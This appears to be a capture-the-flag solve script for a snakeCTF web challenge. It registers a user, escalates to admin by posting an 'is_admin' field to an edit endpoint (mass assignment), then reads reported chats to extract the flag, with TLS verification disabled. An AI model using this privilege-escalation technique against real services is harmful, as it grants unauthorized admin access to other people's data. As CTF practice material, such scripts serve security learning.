#!/usr/bin/env python3

import re
import sys
import requests
import random
import string
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if len(sys.argv) == 1:
    print(f"Usage: {sys.argv[0]} https://url.for.challenge.tld")
    exit(1)
url = sys.argv[1]

def generate_random_string(length=10):
    return ''.join(random.choice(string.ascii_lowercase) for i in range(length))

def generate_random_email():
    return f"{generate_random_string()}@{generate_random_string(5)}.com"

def register_user():
    username = f"testuser_{generate_random_string(5)}"
    email = generate_random_email()
    password = "password123"

    register_url = f"{url}/api/register"
    payload = {"username": username, "email": email, "password": password}
    try:
        response = requests.post(register_url, json=payload, verify=False)
        response.raise_for_status()
        return response.json()['token']
    except requests.exceptions.RequestException as e:
        print(f"Error during registration: {e}")
        return None

def complete_onboarding(jwt_token):
    onboarding_url = f"{url}/api/onboarding"
    headers = {"Authorization": f"Bearer {jwt_token}"}
    payload = {
        "role": "GREY_HAT",
        "looking_for": "WHITE_HAT",
        "age": 25,
        "likes": ["coding", "ctfs"],
        "dislikes": ["bugs", "bad_code"],
        "bio": "Just a test user looking for some fun.",
        "location": "Internet",
        "hacks": ["sql_injection"],
        "favorite_hacker": "Kevin Mitnick",
        "favorite_song": "Never Gonna Give You Up",
        "favorite_movie": "Hackers",
        "touches_grass": False,
    }
    try:
        response = requests.post(onboarding_url, headers=headers, json=payload, verify=False)
        response.raise_for_status()
        return True
    except requests.exceptions.RequestException as e:
        print(f"Error during onboarding: {e}")
        return False
    
def become_admin(jwt_token):
    edit_url = f"{url}/api/edit"
    headers = {"Authorization": f"Bearer {jwt_token}"}
    payload = {"is_admin": True}
    try:
        response = requests.post(edit_url, headers=headers, json=payload, verify=False)
        if response.status_code == 200:
            return True
        else:
            print(f"Failed to become admin: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error while trying to become admin: {e}")
    
def report_match(jwt_token, match_id):
    report_url = f"{url}/api/chat/{match_id}/report"
    headers = {"Authorization": f"Bearer {jwt_token}"}
    try:
        response = requests.post(report_url, headers=headers, verify=False)
        if response.status_code != 200:
            print(f"Failed to report match {match_id}: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error reporting match {match_id}: {e}")

def get_chat(jwt_token, match_id):
    headers = {"Authorization": f"Bearer {jwt_token}"}
    chat_url = f"{url}/api/chat/{match_id}"
    try:
        response = requests.get(chat_url, headers=headers, verify=False)
        if response.status_code == 200:
            return response.json().get('messages', [])
        elif response.status_code == 403:
            print(f"Access denied to chat {match_id}")
        else:
            print(f"Unexpected status code for chat {match_id}: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error fetching chat {match_id}: {e}")
        
    return None

def extract_flag(message):
    match = re.search(r'snakeCTF{[^}]+}', message)
    if match:
        return match.group(0)
    return None

if __name__ == "__main__":
    jwt_token = register_user()
    if jwt_token:
        if complete_onboarding(jwt_token):
            if become_admin(jwt_token):
                for match_id in range(1, 5):
                    report_match(jwt_token, match_id)
                    reported_messages = str(get_chat(jwt_token, match_id))
                    if reported_messages:
                        flag = extract_flag(reported_messages)
                        if flag:
                            print(flag)
                            break